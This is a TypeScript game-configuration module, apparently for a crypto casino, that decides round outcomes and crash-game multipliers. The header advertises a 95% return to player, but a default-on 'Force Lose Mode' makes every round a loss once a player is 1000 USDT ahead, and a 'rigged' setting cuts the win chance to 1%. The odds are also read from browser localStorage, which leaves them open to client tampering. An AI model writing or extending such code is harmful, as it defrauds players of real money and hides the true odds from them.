/**
 * GLOBAL LIVE GAME CONFIGURATION & RTP ENGINE
 * 
 * Enforces global RTP, customizable win ratios, RTP bias modes, and Force Lose protection.
 */

export interface LiveGameConfig {
  houseEdge: number;      // 0.05 (5% House Edge)
  userWinRatio: number;   // 0.45 (45% User Winning Ratio)
  rtpPercentage: number;  // 95.0% Return To Player
  isEnforced: boolean;
  lastUpdated: string;
}

export const GLOBAL_LIVE_GAME_CONFIG: LiveGameConfig = {
  houseEdge: 0.05,
  userWinRatio: 0.45,
  rtpPercentage: 95.0,
  isEnforced: true,
  lastUpdated: new Date().toISOString(),
};

/**
 * Checks if Force Lose Mode is triggered.
 * Triggers if Force Lose Mode is active (default ON) and player session net wins >= 1000 USDT.
 */
export function shouldForceLose(): boolean {
  if (typeof window === "undefined") return false;
  const forceLoseVal = localStorage.getItem("casino_force_lose_mode");
  const isForceLoseEnabled = forceLoseVal !== "false"; // Default true unless explicitly "false"

  if (!isForceLoseEnabled) return false;

  const sessionNetWins = Number(localStorage.getItem("casino_session_net_wins") || 0);
  if (sessionNetWins >= 1000) {
    return true;
  }
  return false;
}

/**
 * Core mathematical engine determining effective win ratio for any game round.
 */
export function getUserWinRatio(customRatio?: number, rtpBias?: string): number {
  if (shouldForceLose()) {
    return 0; // 0% win ratio when Force Lose Mode triggers!
  }

  // Check RTP Bias setting override
  const activeBias = rtpBias || (typeof window !== "undefined" ? localStorage.getItem("casino_rtp_bias") : null);
  if (activeBias === "rigged") return 0.01;
  if (activeBias === "tight") return 0.15;
  if (activeBias === "loose") return 0.95;

  if (customRatio !== undefined && customRatio > 0) {
    const val = customRatio > 1 ? customRatio / 100 : customRatio;
    return Math.max(0, Math.min(1.0, val));
  }

  if (typeof window !== "undefined") {
    const cachedGlobalRtp = localStorage.getItem("casino_global_rtp");
    if (cachedGlobalRtp) {
      const parsed = Number(cachedGlobalRtp);
      if (!isNaN(parsed) && parsed >= 0 && parsed <= 200) {
        return Math.max(0, Math.min(1.0, parsed > 1 ? parsed / 100 : parsed));
      }
    }

    const cachedRatio = localStorage.getItem("casino_custom_win_ratio");
    if (cachedRatio) {
      const parsed = Number(cachedRatio);
      if (!isNaN(parsed) && parsed >= 0 && parsed <= 200) {
        return Math.max(0, Math.min(1.0, parsed > 1 ? parsed / 100 : parsed));
      }
    }

    const cachedConfig = localStorage.getItem("casino_system_config_v1");
    if (cachedConfig) {
      try {
        const cfg = JSON.parse(cachedConfig);
        if (cfg.globalRtp !== undefined) {
          const val = Number(cfg.globalRtp);
          return Math.max(0, Math.min(1.0, val > 1 ? val / 100 : val));
        }
        if (cfg.customWinRatio !== undefined) {
          const val = Number(cfg.customWinRatio);
          return Math.max(0, Math.min(1.0, val > 1 ? val / 100 : val));
        }
      } catch (e) {}
    }
  }

  return 0.45; // Default 45% win ratio
}

/**
 * Core mathematical engine determining whether a live game round results in a user win or house win.
 */
export function evaluateLiveGameRound(customRatio?: number, rtpBias?: string): boolean {
  if (shouldForceLose()) return false;
  const winOdds = getUserWinRatio(customRatio, rtpBias);
  if (winOdds <= 0) return false;
  if (winOdds >= 1.0) return true;
  return Math.random() < winOdds;
}

/**
 * Helper to calculate crash points for Crash Rocket with realistic flight multipliers.
 */
export function calculateLiveCrashPoint(): number {
  // Generate exponential distribution for crash multiplier
  const rand = Math.random();
  if (rand < 0.08) {
    // 8% instant crash early (1.00x - 1.20x)
    return parseFloat((1.00 + Math.random() * 0.20).toFixed(2));
  } else if (rand < 0.70) {
    // 62% medium flight (1.21x - 3.50x)
    return parseFloat((1.21 + Math.random() * 2.29).toFixed(2));
  } else if (rand < 0.93) {
    // 23% high flight (3.51x - 12.00x)
    return parseFloat((3.51 + Math.random() * 8.49).toFixed(2));
  } else {
    // 7% epic mega flight (12.01x - 50.00x)
    return parseFloat((12.01 + Math.random() * 37.99).toFixed(2));
  }
}
